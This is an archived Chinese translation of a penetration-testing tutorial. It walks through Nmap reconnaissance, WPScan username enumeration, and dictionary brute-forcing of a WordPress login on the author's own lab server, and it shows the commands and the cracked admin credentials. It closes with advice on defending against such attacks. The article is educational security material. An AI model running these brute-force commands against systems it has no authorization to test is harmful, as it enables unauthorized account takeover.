@@ -1,0 +1,142 @@
+<!doctype html><html class=no-js lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>使用 Linux 安全工具进行渗透测试 - Linux.cn Archive</title>
+<script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content><meta property="og:title" content="使用 Linux 安全工具进行渗透测试"><meta property="og:description" content="使用 Kali Linux 和其他开源工具来发现系统中的安全漏洞和弱点。"><meta property="og:type" content="article"><meta property="og:url" content="/article-13650-1.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-05T11:11:00+00:00"><meta property="article:modified_time" content="2021-08-05T11:11:00+00:00"><meta itemprop=name content="使用 Linux 安全工具进行渗透测试"><meta itemprop=description content="使用 Kali Linux 和其他开源工具来发现系统中的安全漏洞和弱点。"><meta itemprop=datePublished content="2021-08-05T11:11:00+00:00"><meta itemprop=dateModified content="2021-08-05T11:11:00+00:00"><meta itemprop=wordCount content="958"><meta itemprop=keywords content="安全,Kali,"><link rel=preconnect href=https://fonts.bunny.net crossorigin><link rel=dns-prefetch href=//fonts.bunny.net><link rel=dns-prefetch href=//fonts.bunny.net><link rel=stylesheet href="https://fonts.bunny.net/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class=logo><a class=logo__link href=/ title="Linux.cn Archive" rel=home><div class="logo__item logo__text"><div class=logo__title>Linux.cn Archive</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
+<span class=menu__btn-title tabindex=-1>Menu</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/><span class=menu__text>Home</span></a></li><li class=menu__item><a class=menu__link href=/categories/><span class=menu__text>Categories</span></a></li><li class=menu__item><a class=menu__link href=/tags/><span class=menu__text>Tags</span></a></li><li class=menu__item><a class=menu__link href><span class=menu__text>RSS</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>使用 Linux 安全工具进行渗透测试</h1><div class="post__meta meta"><div class="meta__item-datetime meta__item"><svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class=meta__text datetime=2021-08-05T11:11:00Z>August 05, 2021</time></div></div></header><div class="content post__content clearfix"><blockquote><p>使用 Kali Linux 和其他开源工具来发现系统中的安全漏洞和弱点。</p></blockquote><p><img src=https://img.linux.net.cn/data/attachment/album/202108/05/111124w66lpuzsc467nlv1.jpg alt title="Magnifying glass on code"></p><p>众多被广泛报道的大型消费企业入侵事件凸显了系统安全管理的重要性。幸运的是，有许多不同的应用程序可以帮助保护计算机系统。其中一个是 <a href=https://www.kali.org/>Kali</a>，一个为安全和渗透测试而开发的 Linux 发行版。本文演示了如何使用 Kali Linux 来审视你的系统以发现弱点。</p><p>Kali 安装了很多工具，它们都是开源的，默认情况下安装了它们会让事情变得更容易。</p><p>（LCTT 译注：Kali 及其携带工具只应该用于对自己拥有合法审查权利的系统和设备，任何未经授权的扫描、渗透和攻击均是违法的。本文作者、译者均不承担任何非授权使用的结果。）</p><p><img src=https://img.linux.net.cn/data/attachment/album/202108/05/111432agz4p47zg19878hb.png alt="Kali&rsquo;s tools" title="Kali's tools"></p><p>本文使用的系统是：</p><ol><li><code>kali.usersts.redhat.com</code>：这是我将用来启动扫描和攻击的系统。它拥有 30GB 内存和 6 个虚拟 CPU（vCPU）。</li><li><code>vulnerable.usersys.redhat.com</code>: 这是一个 Red Hat 企业版 Linux 8 系统，它会成为目标。它拥有 16GB 内存和 6 个 vCPU。它是一个相对较新的系统，但有些软件包可能已经过时。</li><li>这个系统包括 <code>httpd-2.4.37-30.module+el8.3.0+7001+0766b9e7.x86_64</code>、 <code>mariadb-server-10.3.27-3.module+el8.3.0+8972+5e3224e9.x86_64</code>、 <code>tigervnc-server-1.9.0-15.el8_1.x86_64</code>、 <code>vsftpd-3.0.3-32.el8.x86_64</code> 和一个 5.6.1 版本的 WordPress。</li></ol><p>我在上面列出了硬件规格，因为一些任务要求很高，尤其是在运行 WordPress 安全扫描程序（<a href=https://wpscan.com/wordpress-security-scanner>WPScan</a>）时对目标系统 CPU 的要求。</p><h3 id=探测你的系统>探测你的系统</h3><p>首先，我会在目标系统上进行基本的 Nmap 扫描（你可以阅读 <a href=https://www.redhat.com/sysadmin/using-nmap-harden-systems>使用 Nmap 结果帮助加固 Linux 系统</a> 一文来更深入地了解 Nmap）。Nmap 扫描是一种快速的方法，可以大致了解被测系统中哪些端口和服务是暴露的。</p><p><img src=https://img.linux.net.cn/data/attachment/album/202108/05/111432djyu3tefh7y1uork.png alt="Nmap scan" title="Nmap scan"></p><p>默认扫描显示有几个你可能感兴趣的开放端口。实际上，任何开放端口都可能成为攻击者破坏你网络的一种方式。在本例中，端口 21、22、80 和 443 是不错的扫描对象，因为它们是常用服务的端口。在这个早期阶段，我只是在做侦察工作，尽可能多地获取有关目标系统的信息。</p><p>我想用 Nmap 侦察 80 端口，所以我使用 <code>-p 80</code> 参数来查看端口 80，<code>-A</code> 参数来获取操作系统和应用程序版本等信息。</p><p><img src=https://img.linux.net.cn/data/attachment/album/202108/05/111432k4gboiqz8jobx1y5.png alt="Nmap scan of port 80" title="Nmap scan of port 80"></p><p>关键信息有：</p><pre tabindex=0><code>PORT   STATE SERVICE VERSION
+80/tcp open  http       Apache httpd 2.4.37 ((Red Hat Enterprise Linux))
+|_http-generator: WordPress 5.6.1
+</code></pre><p>现在我知道了这是一个 WordPress 服务器，我可以使用 WPScan 来获取有关潜在威胁的信息。一个很好的侦察方法是尝试找到一些用户名，使用 <code>--enumerate u</code> 告诉 WPScan 在 WordPress 实例中查找用户名。例如：</p><pre tabindex=0><code>┌──(root?kali)-[~]
+└─# wpscan --url vulnerable.usersys.redhat.com --enumerate u
+_______________________________________________________________
+        __              _______   _____
+        \ \     / /  __ \ / ____|
+        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+        \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+                \  /\  /  | |   ____) | (__| (_| | | | |
+                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.10
+        Sponsored by Automattic - https://automattic.com/
+        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://vulnerable.usersys.redhat.com/ [10.19.47.242]
+[+] Started: Tue Feb 16 21:38:49 2021
+
+Interesting Finding(s):
+...
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] pgervase
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+</code></pre><p>这显示有两个用户：<code>admin</code> 和 <code>pgervase</code>。我将尝试使用密码字典来猜测 <code>admin</code> 的密码。密码字典是一个包含很多密码的文本文件。我使用的字典大小有 37G，有 3,543,076,137 行。</p><p>就像你可以选择不同的文本编辑器、Web 浏览器和其他应用程序 一样，也有很多工具可以启动密码攻击。下面是两个使用 Nmap 和 WPScan 的示例命令：</p><pre tabindex=0><code># nmap -sV --script http-wordpress-brute --script-args userdb=users.txt,passdb=/path/to/passworddb,threads=6 vulnerable.usersys.redhat.com
+</code></pre><pre tabindex=0><code># wpscan --url vulnerable.usersys.redhat.com --passwords /path/to/passworddb --usernames admin --max-threads 50 | tee nmap.txt
+</code></pre><p>这个 Nmap 脚本是我使用的许多脚本之一，使用 WPScan 扫描 URL 只是这个工具可以完成的许多任务之一。你可以用你喜欢的那一个。</p><p>WPScan 示例在文件末尾显示了密码：</p><pre tabindex=0><code>┌──(root?kali)-[~]
+└─# wpscan --url vulnerable.usersys.redhat.com --passwords passwords.txt --usernames admin
+_______________________________________________________________
+        __              _______   _____
+        \ \     / /  __ \ / ____|
+        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+        \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+                \  /\  /  | |   ____) | (__| (_| | | | |
+                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.10
+        Sponsored by Automattic - https://automattic.com/
+        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://vulnerable.usersys.redhat.com/ [10.19.47.242]
+[+] Started: Thu Feb 18 20:32:13 2021
+
+Interesting Finding(s):
+
+......
+
+[+] Performing password attack on Wp Login against 1 user/s
+Trying admin / redhat Time: 00:01:57 &lt;==================================================================================================================&gt; (3231 / 3231) 100.00% Time: 00:01:57
+Trying admin / redhat Time: 00:01:57 &lt;=========================================================                                                         &gt; (3231 / 6462) 50.00%  ETA: ??:??:??
+[SUCCESS] - admin / redhat                                                                                                                                                                      
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: redhat
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu Feb 18 20:34:15 2021
+[+] Requests Done: 3255
+[+] Cached Requests: 34
+[+] Data Sent: 1.066 MB
+[+] Data Received: 24.513 MB
+[+] Memory used: 264.023 MB
+[+] Elapsed time: 00:02:02
+</code></pre><p>在末尾的“找到有效组合”部分包含了管理员用户名和密码，3231 行只用了两分钟。</p><p>我还有另一个字典文件，其中包含 3,238,659,984 行，使用它花费的时间更长并且会留下更多的证据。</p><p>使用 Nmap 可以更快地产生结果：</p><pre tabindex=0><code>┌──(root?kali)-[~]
+└─# nmap -sV --script http-wordpress-brute --script-args userdb=users.txt,passdb=password.txt,threads=6 vulnerable.usersys.redhat.com
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 20:48 EST
+Nmap scan report for vulnerable.usersys.redhat.com (10.19.47.242)
+Host is up (0.00015s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 8.0 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.37 ((Red Hat Enterprise Linux))
+|_http-server-header: Apache/2.4.37 (Red Hat Enterprise Linux)
+| http-wordpress-brute:
+|   Accounts:
+|       admin:redhat - Valid credentials              &lt;&lt;&lt;&lt;&lt;&lt;&lt;
+|       pgervase:redhat - Valid credentials         &lt;&lt;&lt;&lt;&lt;&lt;&lt;
+|_  Statistics: Performed 6 guesses in 1 seconds, average tps: 6.0
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version     port/proto  service
+|   100000  2,3,4       111/tcp   rpcbind
+|   100000  2,3,4       111/udp   rpcbind
+|   100000  3,4         111/tcp6  rpcbind
+|_  100000  3,4         111/udp6  rpcbind
+3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB
+MAC Address: 52:54:00:8C:A1:C0 (QEMU virtual NIC)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
+</code></pre><p>然而，运行这样的扫描可能会在目标系统上留下大量的 HTTPD 日志消息：</p><pre tabindex=0><code>10.19.47.170 - - [18/Feb/2021:20:14:01 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] &#34;POST /wp-login.php HTTP/1.1&#34; 200 7575 &#34;http://vulnerable.usersys.redhat.com/&#34; &#34;WPScan v3.8.10 (https://wpscan.org/)&#34;
+</code></pre><p>为了获得关于在最初的 Nmap 扫描中发现的 HTTPS 服务器的信息，我使用了 <code>sslscan</code> 命令：</p><pre tabindex=0><code>┌──(root?kali)-[~]
+└─# sslscan vulnerable.usersys.redhat.com
+Version: 2.0.6-static
+OpenSSL 1.1.1i-dev  xx XXX xxxx
+
+Connected to 10.19.47.242
+
+Testing SSL server vulnerable.usersys.redhat.com on port 443 using SNI name vulnerable.usersys.redhat.com
+
+  SSL/TLS Protocols:
+SSLv2   disabled
+SSLv3   disabled
+TLSv1.0   disabled
+TLSv1.1   disabled
+TLSv1.2   enabled
+TLSv1.3   enabled
+&lt;snip&gt;
+</code></pre><p>它显示了有关启用的 SSL 协议的信息，在最下方，是关于 Heartbleed 漏洞的信息：</p><pre tabindex=0><code>  Heartbleed:
+TLSv1.3 not vulnerable to heartbleed
+TLSv1.2 not vulnerable to heartbleed
+</code></pre><h3 id=防御或减轻攻击的技巧>防御或减轻攻击的技巧</h3><p>有很多方法可以保护你的系统免受大量攻击。几个关键点是：</p><ul><li>**了解你的系统：**包括了解哪些端口是开放的，哪些端口应该开放，谁应该能够看到这些开放的端口，以及使用这些端口服务的预期流量是多少。Nmap 是了解网络系统的一个绝佳工具。</li><li><strong>使用当前的最佳实践：</strong> 现在的最佳实践可能不是未来的最佳实践。作为管理员，了解信息安全领域的最新趋势非常重要。</li><li><strong>知道如何使用你的产品：</strong> 例如，与其让攻击者不断攻击你的 WordPress 系统，不如阻止他们的 IP 地址并限制尝试登录的次数。在现实世界中，阻止 IP 地址可能没有那么有用，因为攻击者可能会使用受感染的系统来发起攻击。但是，这是一个很容易启用的设置，可以阻止一些攻击。</li><li><strong>维护和验证良好的备份：</strong> 如果攻击者攻击了一个或多个系统，能从已知的良好和干净的备份中重新构建可以节省大量时间和金钱。</li><li><strong>检查日志：</strong> 如上所示，扫描和渗透命令可能会留下大量日志，这表明攻击者正在攻击系统。如果你注意到它们，可以采取先发制人的行动来降低风险。</li><li><strong>更新系统、应用程序和任何额外的模块：</strong> 正如 <a href=https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-40r3.pdf>NIST Special Publication 800-40r3</a> 所解释的那样，“补丁通常是减轻软件缺陷漏洞最有效的方法，而且通常是唯一完全有效的解决方案。”</li><li><strong>使用供应商提供的工具：</strong> 供应商有不同的工具来帮助你维护他们的系统，因此一定要充分利用它们。例如，红帽企业 Linux 订阅中包含的 <a href=https://www.redhat.com/sysadmin/how-red-hat-insights>Red Hat Insights</a> 可以帮助你优化系统并提醒你注意潜在的安全威胁。</li></ul><h3 id=了解更多>了解更多</h3><p>本文对安全工具及其使用方法的介绍只是冰山一角。深入了解的话，你可能需要查看以下资源：</p><ul><li><a href=https://en.wikipedia.org/wiki/Armitage_(computing)>Armitage</a>，一个开源的攻击管理工具</li><li><a href=https://access.redhat.com/security>Red Hat 产品安全中心</a></li><li><a href=https://www.redhat.com/en/blog/channel/security>Red Hat 安全频道</a></li><li><a href=https://www.nist.gov/cybersecurity>NIST 网络安全页面</a></li><li><a href=https://www.redhat.com/sysadmin/using-nmap-harden-systems>使用 Nmap 结果来帮助加固 Linux 系统</a></li></ul><hr><p>via: <a href=https://opensource.com/article/21/5/linux-security-tools>https://opensource.com/article/21/5/linux-security-tools</a></p><p>作者：<a href=https://opensource.com/users/pgervase>Peter Gervase</a> 选题：<a href=https://github.com/lujun9972>lujun9972</a> 译者：<a href=https://github.com/MjSeven>MjSeven</a> 校对：<a href=https://github.com/wxy>wxy</a></p><p>本文由 <a href=https://github.com/LCTT/TranslateProject>LCTT</a> 原创编译，<a href=https://linux.cn/>Linux中国</a> 荣誉推出</p></div><footer class=post__footer><div class="post__tags tags clearfix"><svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5.0 11V3C0 1.5.8.8.8.8S1.5.0 3 0h8c1.5.0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 100-6 3 3 0 000 6z"/></svg><ul class=tags__list><li class=tags__item><a class="tags__link btn" href=/tags/%E5%AE%89%E5%85%A8/ rel=tag>安全</a></li><li class=tags__item><a class="tags__link btn" href=/tags/kali/ rel=tag>Kali</a></li></ul></div></footer></article></main></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2025 Linux.cn Archive.
+<span class=footer__copyright-credits>Generated with <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> and <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> theme.</span></div></div></footer></div><script async defer src=/js/menu.js></script></body></html>
